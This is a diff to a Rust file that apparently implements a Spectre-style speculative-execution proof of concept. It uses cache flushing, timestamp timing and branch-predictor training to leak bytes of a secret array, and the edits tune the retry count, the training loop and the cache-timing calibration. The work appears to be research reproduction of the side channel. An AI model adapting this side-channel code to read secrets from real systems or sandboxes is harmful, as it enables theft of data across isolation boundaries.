@@ -7,7 +7,7 @@ use std::arch::x86_64::_mm_clflush;
 #[cfg(all(target_arch = "x86_64"))]
 use std::arch::x86_64::_mm_mfence;
 #[cfg(all(target_arch = "x86_64"))]
-use std::arch::x86_64::_rdtsc;
+use crate::_rdtsc;
 use std::io::Write;
 
 // In case of wasm target, then this is imported from the host
@@ -54,7 +54,7 @@ fn read_memory_byte(malicious_x: usize, hit: u64, miss: u64) -> ([u64; 2], [u64;
         eprint!("latencies = [")
     }*/
     // Get the TRIES from env
-    let tries = std::env::var("TRIES").unwrap_or("10000".to_string());
+    let tries = std::env::var("TRIES").unwrap_or("100000".to_string());
     let tries = tries.parse::<u64>().unwrap();
     unsafe {
         _mm_mfence();
@@ -84,7 +84,7 @@ fn read_memory_byte(malicious_x: usize, hit: u64, miss: u64) -> ([u64; 2], [u64;
         }
 
         // Train the access?
-        for j in 0..100 {
+        for j in 0..20 {
             unsafe {
                 let addr = &array_for_prediction[secret_data_bytes[malicious_x] as usize * STRIDE]
                     as *const u8;
@@ -167,7 +167,7 @@ fn print_byte(byte: u8) {
     if byte.is_ascii_graphic() || byte.is_ascii_whitespace() {
         print!("{}", byte as char);
     } else {
-        print!(" '\\x{:02x}' ", byte);
+        print!("x");
     }
 }
 
@@ -192,8 +192,9 @@ pub fn main() {
         public_data[15] = 16;
     }
 
+    let (cache_hit, cache_miss) = reproduction::get_cache_time(&array_for_prediction, 100000000);
+    
     for j in 0..11 {
-        let (cache_hit, cache_miss) = reproduction::get_cache_time(&array_for_prediction);
         unsafe {
             _mm_mfence();
         }
